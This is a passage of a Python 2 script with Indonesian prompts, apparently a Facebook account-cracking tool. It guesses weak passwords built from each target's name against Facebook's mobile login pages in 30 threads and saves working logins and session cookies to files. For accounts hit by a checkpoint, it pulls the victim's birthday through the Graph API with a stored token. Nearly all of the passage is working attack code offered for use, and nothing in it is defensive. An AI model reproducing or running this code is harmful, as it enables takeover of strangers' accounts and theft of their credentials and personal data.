    print ' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n \x1b[1;92m[!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''

    def main(user):
        global loop
        global token
        try:
            ua = open('ugent.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11'

        pwx = []
        sys.stdout.write('\r \x1b[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('|')
        if len(name) >= 6:
            pwx = [
             name, name + '123', name + '1234', name + '12345']
        else:
            if len(name) <= 2:
                pwx = [
                 name + '123', name + '1234', name + '12345']
            elif len(name) <= 3:
                pwx = [
                 name + '123', name + '12345']
            else:
                pwx = [
                 name + '123', name + '12345']
            try:
                for pw in pwx:
                    pw = pw.lower()
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\r\x1b[1;92m  * --> ' + uid + '|' + pw + '        '
                        ok.append(uid + '|' + pw)
                        open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                        break
                        continue
                    if 'checkpoint' in xo:
                        try:
                            token = open('login.txt').read()
                            sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                            b = json.loads(sw.text)
                            graph = b['birthday']
                            month, day, year = graph.split('/')
                            month = bulan[month]
                            print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                            cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                            open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                            break
                        except (KeyError, IOError):
                            graph = ' '
                        except:
                            pass

                        print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                        cp.append(uid + '|' + pw)
                        open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                        break
                        continue

                loop += 1
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;93m [#] crack selesai...'
    exit()


def mobile():
    print '\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % tanggal
    print ' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n \x1b[1;92m[!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''

    def main(user):
        global loop
        global token
        try:
            ua = open('ugent.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11'

        pwx = []
        sys.stdout.write('\r \x1b[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('|')
        if len(name) >= 6:
            pwx = [
             name, name + '123', name + '1234', name + '12345']
        else:
            if len(name) <= 2:
                pwx = [
                 name + '123', name + '1234', name + '12345']
            elif len(name) <= 3:
                pwx = [
                 name + '123', name + '12345']
            else:
                pwx = [
                 name + '123', name + '12345']
            try:
                for pw in pwx:
                    pw = pw.lower()
                    ses = requests.Session()
                    ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = ses.get('https://m.facebook.com')
                    b = ses.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'})
                    if 'c_user' in ses.cookies.get_dict().keys():
                        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        print '\r  %s* --> %s|%s|%s                 %s' % (H, uid, pw, kuki, N)
                        wrt = '  * --> %s|%s|%s' % (uid, pw, kuki)
                        ok.append(wrt)
                        open('OK/%s.txt' % tanggal, 'a').write('%s\n' % wrt)
                        break
                        continue
                    elif 'checkpoint' in ses.cookies.get_dict().keys():
                        try:
                            token = open('login.txt').read()
                            sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                            b = json.loads(sw.text)
                            graph = b['birthday']
                            month, day, year = graph.split('/')
                            month = bulan[month]
                            print '\r  %s* --> %s|%s|%s %s %s     %s' % (K, uid, pw, day, month, year, N)
                            wrt = '  * --> %s|%s|%s %s %s' % (uid, pw, day, month, year)
                            cp.append(wrt)
                            open('CP/%s.txt' % tanggal, 'a').write('%s\n' % wrt)
                            break
                        except (KeyError, IOError):
                            graph = ' '
                        except:
                            pass

                        print '\r  %s* --> %s|%s                %s' % (K, uid, pw, N)
                        wrt = '  * --> %s|%s' % (uid, pw)
                        open('CP/%s.txt' % tanggal, 'a').write('%s\n' % wrt)
                        break
                        continue

                loop += 1
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;93m [#] crack selesai...'
    exit()


def buat_folder():
    try:
        os.mkdir('CP')
    except:
        pass

    try:
        os.mkdir('OK')
    except:
        pass


if __name__ == '__main__':
    os.system('git pull')
    buat_folder()
    tokenz()
